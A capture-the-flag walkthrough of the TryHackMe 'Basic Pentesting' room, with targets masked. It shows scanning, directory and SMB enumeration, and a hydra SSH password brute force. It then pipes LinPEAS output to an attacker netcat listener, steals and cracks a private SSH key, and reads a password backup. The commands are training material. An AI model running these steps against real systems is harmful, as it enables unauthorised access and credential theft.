<!-- TOC -->

- [Basic Pentesting](#basic-pentesting)
    - [Active Machine Information](#active-machine-information)
    - [Web App Testing and Privilege Escalation](#web-app-testing-and-privilege-escalation)
        - [Discovery and Scanning](#discovery-and-scanning)
        - [Remote Enumeration](#remote-enumeration)
        - [Exploitation](#exploitation)

<!-- /TOC -->

# Basic Pentesting

[Basic Pentesting Room](https://tryhackme.com/room/basicpentestingjt)

This is a machine that allows you to practise web app hacking and privilege escalation

---
## Active Machine Information

| Title | Target IP |
| :----: | :----: |
| Web App Test | `1*.**.*.***` |

---

## Web App Testing and Privilege Escalation

In these set of tasks you'll learn the following:

- brute forcing 
- hash cracking 
- service enumeration
- Linux Enumeration

### Discovery and Scanning

```bash
nmap -sC -sV -oN nmap 1*.**.*.***
```

> - `22/tcp` O***SSH
> - `80/tcp` A*****
> - `138/tcp` S****
> - `445/tcp` S****
> - `8009/tcp` A*****
> - `8080/tcp` A*****

View Page Source: `http://1*.**.*.***`

> `<!-- Check our dev note section if you need to know what to work on. -->`

```bash
gobuster dir -u http://1*.**.*.***/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 100
```

> `/d**********          (Status: 301) [Size: 316] [--> http://1*.**.*.***/d**********/]`


View Page Source: `http://1*.**.*.***/d**********/`

> `href="dev.txt"`

> `href="j.txt"`

Go to: `http://1*.**.*.***/d**********/dev.txt`

Go to: `http://1*.**.*.***/d**********/j.txt`

### Remote Enumeration

```bash
enum4linux 1*.**.*.*** | tee enum4linux
```

> `S-1-22-1-1000 Unix User\k** (Local User)`

> `S-1-22-1-1001 Unix User\j** (Local User)`

```bash
hydra -l j** -P /usr/share/wordlists/rockyou.txt ssh://1*.**.*.***
```

> `[22][ssh] host: 1*.**.*.***   login: j**   password: a******`

### Exploitation

Using: [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

Using: `j**:a******`

```bash
scp /opt/linpeas/linpeas.sh j**@1*.**.*.***:/dev/shm
nc -lvnp 9000 | tee linpeas
ssh j**@1*.**.*.***
```

RHOST:

```bash
cd /dev/shm
chmod 700 linpeas.sh
./linpeas.sh -a -e | nc 1*.**.**.** 9000
```

> `══╣ Possible private SSH keys were found! /home/k**/.ssh/id_rsa`

```bash
cat /home/k**/.ssh/id_rsa
```

- Copy

LHOST:

```bash
cat > k**_id_rsa
```

- Paste
- `ctrl` + `d` (2x)

```bash
ssh2john k**_id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

> `b****** (k**_id_rsa)`

```bash
chmod 600 k**_id_rsa
```

Using: `k**:b******`

```bash
ssh -i k**_id_rsa k**@1*.**.*.***
```

RHOST:

```bash
cat pass.bak
```

> `h*****************************************************$$`
